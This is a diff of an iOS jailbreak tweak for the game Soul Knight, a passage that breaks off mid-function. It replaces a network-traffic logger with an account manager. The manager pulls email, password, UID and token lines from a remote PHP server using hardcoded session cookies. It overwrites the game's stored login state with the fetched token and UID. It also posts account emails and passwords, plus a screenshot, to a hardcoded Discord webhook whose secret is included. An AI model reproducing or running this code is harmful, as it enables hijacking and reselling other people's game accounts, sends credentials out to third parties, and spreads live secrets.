@@ -1,265 +1,828 @@
+// tweak.xm — Soul Knight Account Manager v7
+// iOS 14+ | Theos/Logos | ARC
+
 #import <UIKit/UIKit.h>
 #import <Foundation/Foundation.h>
+#import <objc/runtime.h>
 
-static NSMutableArray *logs;
-
-// ─────────────────────────────────────────
-// Logger
-// ─────────────────────────────────────────
-static void AddLog(NSString *log) {
-    if (!logs) logs = [NSMutableArray new];
-
-    NSString *entry = [NSString stringWithFormat:
-                       @"\n====================\n%@\n====================\n", log];
-    [logs addObject:entry];
-    NSLog(@"%@", entry);
+// ── UIButton block helper ─────────────────────────────────────────────────────
+@interface UIButton (SKActionBlock)
+- (void)sk_setActionBlock:(void(^)(void))block;
+@end
+@implementation UIButton (SKActionBlock)
+static char kSKActionBlockKey;
+- (void)sk_setActionBlock:(void(^)(void))block {
+    objc_setAssociatedObject(self, &kSKActionBlockKey,
+        [block copy], OBJC_ASSOCIATION_COPY_NONATOMIC);
+    [self removeTarget:self action:@selector(sk_invokeActionBlock)
+      forControlEvents:UIControlEventTouchUpInside];
+    [self addTarget:self action:@selector(sk_invokeActionBlock)
+   forControlEvents:UIControlEventTouchUpInside];
 }
-
-static NSString *DataToString(NSData *data) {
-    if (!data) return @"<empty>";
-    NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-    return str ?: [NSString stringWithFormat:@"<%lu bytes>", (unsigned long)data.length];
+- (void)sk_invokeActionBlock {
+    void (^b)(void) = objc_getAssociatedObject(self, &kSKActionBlockKey);
+    if (b) b();
 }
-
-// ─────────────────────────────────────────
-// Shared: present alert from key window
-// ─────────────────────────────────────────
-static void PresentAlert(UIAlertController *alert) {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        UIWindow *keyWindow = [UIApplication sharedApplication].windows.firstObject;
-        if (keyWindow.rootViewController) {
-            [keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
-        }
-    });
-}
-
-// ─────────────────────────────────────────
-// Copy to clipboard
-// ─────────────────────────────────────────
-static void CopyLogsToClipboard() {
-    NSString *all = [logs componentsJoinedByString:@"\n"];
-    [UIPasteboard generalPasteboard].string = all;
-
-    NSLog(@"[EXPORT] Copied logs to clipboard");
-
-    UIAlertController *alert = [UIAlertController
-                                alertControllerWithTitle:@"Export"
-                                message:@"Logs copied to clipboard"
-                                preferredStyle:UIAlertControllerStyleAlert];
-    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
-                                              style:UIAlertActionStyleDefault
-                                            handler:nil]];
-    PresentAlert(alert);
-}
-
-// ─────────────────────────────────────────
-// Save logs to Documents directory
-// ─────────────────────────────────────────
-static void SaveLogsToFile() {
-    NSString *all = [logs componentsJoinedByString:@"\n"];
-    NSData *data = [all dataUsingEncoding:NSUTF8StringEncoding];
-
-    // Build a timestamped filename: logs_YYYYMMDD_HHmmss.txt
-    NSDateFormatter *fmt = [NSDateFormatter new];
-    fmt.dateFormat = @"yyyyMMdd_HHmmss";
-    NSString *timestamp = [fmt stringFromDate:[NSDate date]];
-    NSString *filename = [NSString stringWithFormat:@"logs_%@.txt", timestamp];
-
-    NSString *docsDir = [NSSearchPathForDirectoriesInDomains(
-        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *filePath = [docsDir stringByAppendingPathComponent:filename];
-
-    NSError *error = nil;
-    BOOL success = [data writeToFile:filePath options:NSDataWritingAtomic error:&error];
-
-    NSLog(@"[EXPORT] Save to file: %@ — success: %d", filePath, success);
-
-    NSString *message = success
-        ? [NSString stringWithFormat:@"Saved to:\n%@", filePath]
-        : [NSString stringWithFormat:@"Failed to save:\n%@", error.localizedDescription];
-
-    UIAlertController *alert = [UIAlertController
-                                alertControllerWithTitle:success ? @"Saved" : @"Error"
-                                message:message
-                                preferredStyle:UIAlertControllerStyleAlert];
-    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
-                                              style:UIAlertActionStyleDefault
-                                            handler:nil]];
-    PresentAlert(alert);
-}
-
-// ─────────────────────────────────────────
-// Floating button
-// ─────────────────────────────────────────
-@interface FloatingButton : UIButton
 @end
 
-@implementation FloatingButton
+#pragma mark - Export storage
 
-- (void)handleTap {
-    // Present an action sheet so the user can pick export method
-    UIAlertController *sheet = [UIAlertController
-                                alertControllerWithTitle:@"Export Logs"
-                                message:nil
-                                preferredStyle:UIAlertControllerStyleActionSheet];
-
-    [sheet addAction:[UIAlertAction actionWithTitle:@"Copy to Clipboard"
-                                              style:UIAlertActionStyleDefault
-                                            handler:^(UIAlertAction *action) {
-        CopyLogsToClipboard();
-    }]];
-
-    [sheet addAction:[UIAlertAction actionWithTitle:@"Save to Documents"
-                                              style:UIAlertActionStyleDefault
-                                            handler:^(UIAlertAction *action) {
-        SaveLogsToFile();
-    }]];
-
-    [sheet addAction:[UIAlertAction actionWithTitle:@"Cancel"
-                                              style:UIAlertActionStyleCancel
-                                            handler:nil]];
-
-    // iPad needs a source view for the popover
-    sheet.popoverPresentationController.sourceView = self;
-    sheet.popoverPresentationController.sourceRect = self.bounds;
-
-    dispatch_async(dispatch_get_main_queue(), ^{
-        UIWindow *keyWindow = [UIApplication sharedApplication].windows.firstObject;
-        if (keyWindow.rootViewController) {
-            [keyWindow.rootViewController presentViewController:sheet animated:YES completion:nil];
-        }
-    });
+static NSString *exportsPath(void) {
+    return [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Library/Preferences/SKAccountExports.plist"];
+}
+static NSMutableArray *getExports(void) {
+    NSArray *a = [NSArray arrayWithContentsOfFile:exportsPath()];
+    return a ? [a mutableCopy] : [NSMutableArray new];
+}
+static void writeExports(NSArray *a) {
+    [a writeToFile:exportsPath() atomically:YES];
 }
 
-- (void)handlePan:(UIPanGestureRecognizer *)gesture {
-    CGPoint translation = [gesture translationInView:self.superview];
-    self.center = CGPointMake(self.center.x + translation.x,
-                              self.center.y + translation.y);
-    [gesture setTranslation:CGPointZero inView:self.superview];
+#pragma mark - Bundle-aware paths
+
+static NSString *templateTxtPath(void) {
+    NSString *bid = [NSBundle mainBundle].bundleIdentifier ?: @"com.unknown.app";
+    return [[NSHomeDirectory()
+        stringByAppendingPathComponent:@"Library/Preferences"]
+        stringByAppendingPathComponent:[bid stringByAppendingString:@".txt"]];
 }
 
-@end
+static NSArray<NSString *> *saveDataTypes(void) {
+    return @[@"bp_data", @"item_data", @"misc_data",
+             @"season_data", @"statistic", @"weapon_evolution_data"];
+}
 
-// ─────────────────────────────────────────
-// Overlay window (always on top, passthrough)
-// ─────────────────────────────────────────
-@interface PassthroughWindow : UIWindow
-@end
-
-@implementation PassthroughWindow
-
-- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
-    UIView *hit = [super hitTest:point withEvent:event];
-    if (hit == self.rootViewController.view || hit == self) {
-        return nil;
+static BOOL requiredFilesExist(NSString **missingOut) {
+    NSFileManager *fm = NSFileManager.defaultManager;
+    NSString *txt = templateTxtPath();
+    if (![fm fileExistsAtPath:txt]) {
+        if (missingOut) *missingOut = [txt lastPathComponent];
+        return NO;
     }
-    return hit;
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    for (NSString *t in saveDataTypes()) {
+        NSString *p = [docs stringByAppendingPathComponent:
+                       [NSString stringWithFormat:@"%@_1_.data", t]];
+        if (![fm fileExistsAtPath:p]) {
+            if (missingOut) *missingOut = [p lastPathComponent];
+            return NO;
+        }
+    }
+    return YES;
 }
 
-@end
+#pragma mark - Line parser
 
-@interface PassthroughViewController : UIViewController
-@end
-
-@implementation PassthroughViewController
-@end
-
-static PassthroughWindow *overlayWindow = nil;
-
-// ─────────────────────────────────────────
-// Add floating button
-// ─────────────────────────────────────────
-static void AddFloatingButton() {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        if (overlayWindow) return;
-
-        overlayWindow = [[PassthroughWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
-        overlayWindow.windowLevel = UIWindowLevelAlert + 100;
-        overlayWindow.backgroundColor = [UIColor clearColor];
-        overlayWindow.userInteractionEnabled = YES;
-        overlayWindow.hidden = NO;
-
-        PassthroughViewController *vc = [PassthroughViewController new];
-        vc.view.backgroundColor = [UIColor clearColor];
-        overlayWindow.rootViewController = vc;
-
-        FloatingButton *btn = [FloatingButton buttonWithType:UIButtonTypeSystem];
-        btn.frame = CGRectMake(40, 200, 120, 50);
-        btn.tag = 9999;
-        btn.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.7];
-        [btn setTitle:@"Export Logs" forState:UIControlStateNormal];
-        [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-        btn.layer.cornerRadius = 10;
-
-        [btn addTarget:btn action:@selector(handleTap) forControlEvents:UIControlEventTouchUpInside];
-
-        UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:btn action:@selector(handlePan:)];
-        [btn addGestureRecognizer:pan];
-
-        [vc.view addSubview:btn];
-    });
+static NSDictionary *parseLine(NSString *line) {
+    NSArray *p = [line componentsSeparatedByString:@"|"];
+    if (p.count < 4) return nil;
+    return @{
+        @"email": [p[0] stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet],
+        @"pass" : [p[1] stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet],
+        @"uid"  : [p[2] stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet],
+        @"token": [p[3] stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet]
+    };
 }
 
-// ─────────────────────────────────────────
-// Hook NSURLSession
-// ─────────────────────────────────────────
-%hook NSURLSession
+#pragma mark - Account Apply
 
-- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request
-                            completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))completionHandler {
+static void applyAccount(NSDictionary *acc) {
+    NSString *newUid   = acc[@"uid"];
+    NSString *newToken = acc[@"token"];
+    NSString *newEmail = acc[@"email"];
+    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
 
-    NSString *reqLog = [NSString stringWithFormat:
-                        @"[REQUEST]\nURL: %@\nMethod: %@\nHeaders: %@\nBody: %@",
-                        request.URL.absoluteString,
-                        request.HTTPMethod,
-                        request.allHTTPHeaderFields,
-                        DataToString(request.HTTPBody)];
+    NSString *txtPath = templateTxtPath();
+    NSError  *readErr  = nil;
+    NSString *xmlSrc   = [NSString stringWithContentsOfFile:txtPath
+                                                   encoding:NSUTF8StringEncoding
+                                                      error:&readErr];
+    if (readErr || !xmlSrc.length) return;
 
-    AddLog(reqLog);
+    NSString *patched = [xmlSrc
+        stringByReplacingOccurrencesOfString:@"anhhaideptrai" withString:newToken];
+    patched = [patched
+        stringByReplacingOccurrencesOfString:@"98989898" withString:newUid];
 
-    void (^wrappedHandler)(NSData *, NSURLResponse *, NSError *) =
-        ^(NSData *data, NSURLResponse *response, NSError *error) {
+    NSError *parseErr = nil;
+    NSDictionary *newSnap = [NSPropertyListSerialization
+        propertyListWithData:[patched dataUsingEncoding:NSUTF8StringEncoding]
+                     options:NSPropertyListMutableContainersAndLeaves
+                      format:nil
+                       error:&parseErr];
+    if (parseErr || ![newSnap isKindOfClass:[NSDictionary class]]) return;
 
-            NSHTTPURLResponse *http = (NSHTTPURLResponse *)response;
+    NSDictionary *current = [ud dictionaryRepresentation];
+    for (NSString *k in current) [ud removeObjectForKey:k];
+    for (NSString *k in newSnap) [ud setObject:newSnap[k] forKey:k];
 
-            NSString *respLog = [NSString stringWithFormat:
-                                 @"[RESPONSE]\nURL: %@\nStatus: %ld\nHeaders: %@\nBody: %@",
-                                 request.URL.absoluteString,
-                                 (long)http.statusCode,
-                                 http.allHeaderFields,
-                                 DataToString(data)];
+    NSString *raw = [ud stringForKey:@"SdkStateCache#1"];
+    if (raw) {
+        NSError *je = nil;
+        NSMutableDictionary *root = [[NSJSONSerialization
+            JSONObjectWithData:[raw dataUsingEncoding:NSUTF8StringEncoding]
+            options:NSJSONReadingMutableContainers error:&je] mutableCopy];
+        if (!je && root) {
+            NSMutableDictionary *user    = [root[@"User"]    mutableCopy] ?: [NSMutableDictionary new];
+            NSMutableDictionary *session = [root[@"Session"] mutableCopy] ?: [NSMutableDictionary new];
+            NSMutableDictionary *legacy  = [user[@"LegacyGateway"] mutableCopy] ?: [NSMutableDictionary new];
+            legacy[@"token"]       = newToken;
+            user[@"LegacyGateway"] = legacy;
+            user[@"Email"]         = newEmail;
+            user[@"PlayerId"]      = @([newUid longLongValue]);
+            session[@"Token"]      = newToken;
+            root[@"User"]          = user;
+            root[@"Session"]       = session;
+            NSData *out = [NSJSONSerialization dataWithJSONObject:root
+                options:NSJSONWritingPrettyPrinted error:&je];
+            if (!je && out)
+                [ud setObject:[[NSString alloc] initWithData:out encoding:NSUTF8StringEncoding]
+                       forKey:@"SdkStateCache#1"];
+        }
+    }
 
-            AddLog(respLog);
+    [ud synchronize];
 
-            if (completionHandler) {
-                completionHandler(data, response, error);
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSFileManager *fm = NSFileManager.defaultManager;
+    for (NSString *t in saveDataTypes()) {
+        NSString *src = [docs stringByAppendingPathComponent:
+                         [NSString stringWithFormat:@"%@_1_.data", t]];
+        NSString *dst = [docs stringByAppendingPathComponent:
+                         [NSString stringWithFormat:@"%@_%@_.data", t, newUid]];
+        if ([fm fileExistsAtPath:src]) {
+            [fm removeItemAtPath:dst error:nil];
+            [fm copyItemAtPath:src toPath:dst error:nil];
+        }
+    }
+}
+
+#pragma mark - Remote fetch
+
+static NSData *buildMultipartBody(void) {
+    NSString *boundary = @"----WebKitFormBoundaryfGWYLKxAiP6gsfSo";
+    NSMutableString *s = [NSMutableString new];
+    void (^field)(NSString *, NSString *) = ^(NSString *name, NSString *val) {
+        [s appendFormat:@"--%@\r\n", boundary];
+        [s appendFormat:@"Content-Disposition: form-data; name=\"%@\"\r\n\r\n", name];
+        [s appendFormat:@"%@\r\n", val];
+    };
+    field(@"action",   @"check");
+    field(@"limit",    @"1");
+    field(@"parallel", @"10");
+    [s appendFormat:@"--%@--\r\n", boundary];
+    return [s dataUsingEncoding:NSUTF8StringEncoding];
+}
+
+static void fetchRemoteAccount(void (^completion)(NSDictionary *acc, NSString *errMsg)) {
+    NSURL *url = [NSURL URLWithString:@"https://chillysilly.frfrnocap.men/ccacc.php"];
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url
+        cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
+        timeoutInterval:20];
+    req.HTTPMethod = @"POST";
+
+    NSString *boundary = @"----WebKitFormBoundaryfGWYLKxAiP6gsfSo";
+    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
+       forHTTPHeaderField:@"Content-Type"];
+    [req setValue:@"*/*"               forHTTPHeaderField:@"Accept"];
+    [req setValue:@"vi-VN,vi;q=0.9"   forHTTPHeaderField:@"Accept-Language"];
+    [req setValue:@"gzip, deflate, br" forHTTPHeaderField:@"Accept-Encoding"];
+    [req setValue:@"cors"              forHTTPHeaderField:@"Sec-Fetch-Mode"];
+    [req setValue:@"same-origin"       forHTTPHeaderField:@"Sec-Fetch-Site"];
+    [req setValue:@"empty"             forHTTPHeaderField:@"Sec-Fetch-Dest"];
+    [req setValue:@"https://chillysilly.frfrnocap.men" forHTTPHeaderField:@"Origin"];
+    [req setValue:@"https://chillysilly.frfrnocap.men/ccacc.php" forHTTPHeaderField:@"Referer"];
+    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) "
+                   "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+       forHTTPHeaderField:@"User-Agent"];
+    [req setValue:@"PHPSESSID=883a6ee3b496cc69822e2144d57cc886; "
+                   "token=cf54cf6152d9ae63b1daccc7af669a1d"
+       forHTTPHeaderField:@"Cookie"];
+
+    req.HTTPBody = buildMultipartBody();
+
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:
+        [NSURLSessionConfiguration defaultSessionConfiguration]];
+    [[session dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            if (err || !data) { completion(nil, err.localizedDescription ?: @"Network error"); return; }
+            NSError *je = nil;
+            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&je];
+            if (je || ![json isKindOfClass:[NSDictionary class]]) {
+                NSString *raw = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"Bad response";
+                completion(nil, raw); return;
             }
-        };
-
-    return %orig(request, wrappedHandler);
+            NSArray *lines = json[@"lines"];
+            if (!lines.count) { completion(nil, @"No accounts returned\n(file may be empty)"); return; }
+            NSDictionary *acc = parseLine(lines[0]);
+            if (!acc) { completion(nil, [NSString stringWithFormat:@"Could not parse line:\n%@", lines[0]]); return; }
+            NSMutableDictionary *m = [acc mutableCopy];
+            NSNumber *rem = json[@"remaining_in_file"];
+            if (rem) m[@"remaining"] = [rem stringValue];
+            completion([m copy], nil);
+        });
+    }] resume];
 }
 
-%end
+#pragma mark - Screenshot helper
 
-// ─────────────────────────────────────────
-// Add floating button on app launch
-// ─────────────────────────────────────────
-%hook UIApplication
-
-- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
-    BOOL result = %orig(application, launchOptions);
-    AddFloatingButton();
-    return result;
+static UIImage *captureScreen(void) {
+    UIWindow *keyWin = nil;
+    for (UIWindow *w in UIApplication.sharedApplication.windows)
+        if (!w.isHidden && w.alpha > 0) { keyWin = w; break; }
+    if (!keyWin) return nil;
+    UIGraphicsImageRendererFormat *fmt = [UIGraphicsImageRendererFormat preferredFormat];
+    fmt.scale = UIScreen.mainScreen.scale;
+    UIGraphicsImageRenderer *renderer = [[UIGraphicsImageRenderer alloc]
+        initWithSize:keyWin.bounds.size format:fmt];
+    return [renderer imageWithActions:^(UIGraphicsImageRendererContext *ctx) {
+        [keyWin drawViewHierarchyInRect:keyWin.bounds afterScreenUpdates:YES];
+    }];
 }
 
-%end
+#pragma mark - Discord webhook
 
-// ─────────────────────────────────────────
-// Constructor fallback
-// ─────────────────────────────────────────
-__attribute__((constructor(101))) static void init_hook(void) {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC),
-                   dispatch_get_main_queue(), ^{
-        AddFloatingButton();
+static NSString * const kDiscordWebhook =
+    @"https://discord.com/api/webhooks/1421522837520253059/"
+     "zDz92bS0oq00Giq0xIgIrpAEZQGIGEzwFNYL5dxNKdl1YnmlYnOJ9zGYekEZzyYrsMFL";
+
+static void sendToDiscord(NSArray *accounts, UIImage *screenshot,
+                          void (^completion)(BOOL success, NSString *msg)) {
+    NSURL *url = [NSURL URLWithString:kDiscordWebhook];
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url
+        cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
+        timeoutInterval:30];
+    req.HTTPMethod = @"POST";
+
+    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@",
+        [[NSUUID UUID] UUIDString]];
+    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
+       forHTTPHeaderField:@"Content-Type"];
+
+    // Build account text
+    NSMutableString *accountText = [NSMutableString stringWithString:@"**G2G Export**\n"];
+    for (NSDictionary *a in accounts)
+        [accountText appendFormat:@"`%@|%@`\n", a[@"email"], a[@"pass"]];
+
+    // Build payload JSON
+    NSDictionary *payload = @{ @"content": accountText };
+    NSData *payloadData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+
+    NSMutableData *body = [NSMutableData new];
+    NSString *crlf = @"\r\n";
+
+    // Part 1: JSON payload
+    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Disposition: form-data; name=\"payload_json\"\r\n"
+        dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"Content-Type: application/json\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:payloadData];
+    [body appendData:[crlf dataUsingEncoding:NSUTF8StringEncoding]];
+
+    // Part 2: Screenshot PNG
+    if (screenshot) {
+        NSData *pngData = UIImagePNGRepresentation(screenshot);
+        if (pngData) {
+            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
+                dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[@"Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n"
+                dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[@"Content-Type: image/png\r\n\r\n"
+                dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:pngData];
+            [body appendData:[crlf dataUsingEncoding:NSUTF8StringEncoding]];
+        }
+    }
+
+    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
+        dataUsingEncoding:NSUTF8StringEncoding]];
+
+    req.HTTPBody = body;
+
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:
+        [NSURLSessionConfiguration defaultSessionConfiguration]];
+    [[session dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            NSHTTPURLResponse *http = (NSHTTPURLResponse *)resp;
+            BOOL ok = !err && (http.statusCode == 200 || http.statusCode == 204);
+            NSString *msg = ok ? @"Sent to Discord ✓"
+                : [NSString stringWithFormat:@"Discord error %ld", (long)http.statusCode];
+            completion(ok, msg);
+        });
+    }] resume];
+}
+
+#pragma mark - SKPanel (compact)
+
+// ── Reduced dimensions ────────────────────────────────────────────────────────
+static const CGFloat kPanelW   = 210;   // was 266
+static const CGFloat kBarH     = 36;    // was 44
+static const CGFloat kBtnH     = 36;    // button height
+static const CGFloat kBtnGap   = 6;     // gap between buttons
+static const CGFloat kPad      = 6;
+// Content height = top labels (22+12) + 4 buttons + gaps + bottom pad
+static const CGFloat kContentH = 22 + 12 + (kBtnH * 4) + (kBtnGap * 3) + 10;
+
+@interface SKPanel : UIView
+@property (nonatomic, strong) UIView   *contentPane;
+@property (nonatomic, strong) UILabel  *infoLabel;
+@property (nonatomic, strong) UILabel  *fileStatusLabel;
+@property (nonatomic, strong) UIButton *editBtn;
+@property (nonatomic, strong) UIButton *pasteBtn;
+@property (nonatomic, assign) BOOL     expanded;
+@end
+
+@implementation SKPanel
+
+- (instancetype)init {
+    self = [super initWithFrame:CGRectMake(0, 0, kPanelW, kBarH)];
+    if (!self) return nil;
+    self.clipsToBounds      = NO;
+    self.layer.cornerRadius = 10;
+    self.backgroundColor    = [UIColor colorWithRed:0.08 green:0.08 blue:0.10 alpha:0.96];
+    self.layer.shadowColor   = UIColor.blackColor.CGColor;
+    self.layer.shadowOpacity = 0.75;
+    self.layer.shadowRadius  = 8;
+    self.layer.shadowOffset  = CGSizeMake(0, 3);
+    self.layer.zPosition     = 9999;
+    [self buildBar];
+    [self buildContent];
+    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc]
+        initWithTarget:self action:@selector(onPan:)];
+    [self addGestureRecognizer:pan];
+    return self;
+}
+
+- (void)buildBar {
+    UIView *handle = [[UIView alloc] initWithFrame:CGRectMake(kPanelW/2-16, 5, 32, 3)];
+    handle.backgroundColor    = [UIColor colorWithWhite:0.50 alpha:0.45];
+    handle.layer.cornerRadius = 1.5;
+    [self addSubview:handle];
+
+    UILabel *title = [UILabel new];
+    title.text          = @"SK Manager";
+    title.textColor     = [UIColor colorWithWhite:0.78 alpha:1];
+    title.font          = [UIFont boldSystemFontOfSize:11];
+    title.textAlignment = NSTextAlignmentCenter;
+    title.frame         = CGRectMake(0, 12, kPanelW, 18);
+    title.userInteractionEnabled = NO;
+    [self addSubview:title];
+
+    UIView *tapZone = [[UIView alloc] initWithFrame:CGRectMake(0, 0, kPanelW, kBarH)];
+    tapZone.backgroundColor = UIColor.clearColor;
+    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc]
+        initWithTarget:self action:@selector(toggleExpand)];
+    [tapZone addGestureRecognizer:tap];
+    [self addSubview:tapZone];
+}
+
+- (void)buildContent {
+    self.contentPane = [[UIView alloc]
+        initWithFrame:CGRectMake(0, kBarH, kPanelW, kContentH)];
+    self.contentPane.hidden        = YES;
+    self.contentPane.alpha         = 0;
+    self.contentPane.clipsToBounds = YES;
+    [self addSubview:self.contentPane];
+
+    UIView  *p = self.contentPane;
+    CGFloat w  = kPanelW - kPad * 2;
+    CGFloat y  = 6;
+
+    // ── Export-count label ────────────────────────────────────────────────
+    self.infoLabel = [UILabel new];
+    self.infoLabel.frame         = CGRectMake(kPad, y, w, 12);
+    self.infoLabel.textColor     = [UIColor colorWithWhite:0.52 alpha:1];
+    self.infoLabel.font          = [UIFont systemFontOfSize:9];
+    self.infoLabel.textAlignment = NSTextAlignmentCenter;
+    [p addSubview:self.infoLabel];
+    [self refreshInfo];
+    y += 14;
+
+    // ── File-status label ─────────────────────────────────────────────────
+    self.fileStatusLabel = [UILabel new];
+    self.fileStatusLabel.frame         = CGRectMake(kPad, y, w, 10);
+    self.fileStatusLabel.font          = [UIFont systemFontOfSize:8];
+    self.fileStatusLabel.textAlignment = NSTextAlignmentCenter;
+    self.fileStatusLabel.numberOfLines = 2;
+    [p addSubview:self.fileStatusLabel];
+    [self refreshFileStatus];
+    y += 14;
+
+    // Helper to create compact buttons
+    UIButton *(^makeBtn)(NSString *, UIColor *) = ^(NSString *title, UIColor *bg) {
+        UIButton *b = [UIButton buttonWithType:UIButtonTypeCustom];
+        b.frame = CGRectMake(kPad, y, w, kBtnH);
+        [b setTitle:title forState:UIControlStateNormal];
+        [b setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
+        [b setTitleColor:[UIColor colorWithWhite:0.80 alpha:1] forState:UIControlStateHighlighted];
+        b.titleLabel.font       = [UIFont boldSystemFontOfSize:11];
+        b.backgroundColor       = bg;
+        b.layer.cornerRadius    = 7;
+        return b;
+    };
+
+    // ── Edit button ───────────────────────────────────────────────────────
+    self.editBtn = makeBtn(@"Edit (Fetch & Apply)",
+        [UIColor colorWithRed:0.18 green:0.72 blue:0.38 alpha:1]);
+    [self.editBtn addTarget:self action:@selector(tapEdit)
+          forControlEvents:UIControlEventTouchUpInside];
+    [p addSubview:self.editBtn];
+    y += kBtnH + kBtnGap;
+
+    // ── Paste button ──────────────────────────────────────────────────────
+    self.pasteBtn = makeBtn(@"Paste & Apply",
+        [UIColor colorWithRed:0.18 green:0.48 blue:0.90 alpha:1]);
+    self.pasteBtn.frame = CGRectMake(kPad, y, w, kBtnH);
+    [self.pasteBtn addTarget:self action:@selector(tapPaste)
+           forControlEvents:UIControlEventTouchUpInside];
+    [p addSubview:self.pasteBtn];
+    y += kBtnH + kBtnGap;
+
+    // ── G2G Export button ─────────────────────────────────────────────────
+    UIButton *g2gBtn = makeBtn(@"G2G Export",
+        [UIColor colorWithRed:0.65 green:0.20 blue:0.90 alpha:1]);
+    g2gBtn.frame = CGRectMake(kPad, y, w, kBtnH);
+    [g2gBtn addTarget:self action:@selector(tapG2GExport)
+     forControlEvents:UIControlEventTouchUpInside];
+    [p addSubview:g2gBtn];
+    y += kBtnH + kBtnGap;
+
+    // ── Export button ─────────────────────────────────────────────────────
+    UIButton *expBtn = makeBtn(@"Export used accounts",
+        [UIColor colorWithRed:1.00 green:0.46 blue:0.16 alpha:1]);
+    expBtn.frame = CGRectMake(kPad, y, w, kBtnH);
+    [expBtn addTarget:self action:@selector(tapExport)
+     forControlEvents:UIControlEventTouchUpInside];
+    [p addSubview:expBtn];
+}
+
+- (void)refreshInfo {
+    self.infoLabel.text = [NSString stringWithFormat:@"Export ready: %lu",
+                           (unsigned long)getExports().count];
+}
+
+- (void)refreshFileStatus {
+    NSString *missing = nil;
+    BOOL ok = requiredFilesExist(&missing);
+    if (ok) {
+        self.fileStatusLabel.text      = @"✓ All required files found";
+        self.fileStatusLabel.textColor = [UIColor colorWithRed:0.28 green:0.82 blue:0.42 alpha:1];
+    } else {
+        self.fileStatusLabel.text      = [NSString stringWithFormat:@"⚠ Missing: %@", missing];
+        self.fileStatusLabel.textColor = [UIColor colorWithRed:0.95 green:0.35 blue:0.35 alpha:1];
+    }
+    CGFloat dimAlpha = ok ? 1.0 : 0.38;
+    self.editBtn.enabled  = ok;
+    self.pasteBtn.enabled = ok;
+    self.editBtn.alpha    = dimAlpha;
+    self.pasteBtn.alpha   = dimAlpha;
+}
+
+- (void)toggleExpand {
+    self.expanded = !self.expanded;
+    if (self.expanded) {
+        [self refreshFileStatus];
+        self.contentPane.hidden = NO;
+        self.contentPane.frame  = CGRectMake(0, kBarH, kPanelW, kContentH);
+        [UIView animateWithDuration:0.22 delay:0
+                            options:UIViewAnimationOptionCurveEaseOut
+                         animations:^{
+            CGRect f = self.frame; f.size.height = kBarH + kContentH; self.frame = f;
+            self.contentPane.alpha = 1;
+        } completion:nil];
+    } else {
+        [UIView animateWithDuration:0.18 delay:0
+                            options:UIViewAnimationOptionCurveEaseIn
+                         animations:^{
+            CGRect f = self.frame; f.size.height = kBarH; self.frame = f;
+            self.contentPane.alpha = 0;
+        } completion:^(BOOL _) { self.contentPane.hidden = YES; }];
+    }
+}
+
+- (void)tapEdit {
+    self.editBtn.enabled = NO;
+    [self.editBtn setTitle:@"Fetching…" forState:UIControlStateNormal];
+    self.editBtn.backgroundColor = [UIColor colorWithWhite:0.28 alpha:1];
+
+    fetchRemoteAccount(^(NSDictionary *acc, NSString *errMsg) {
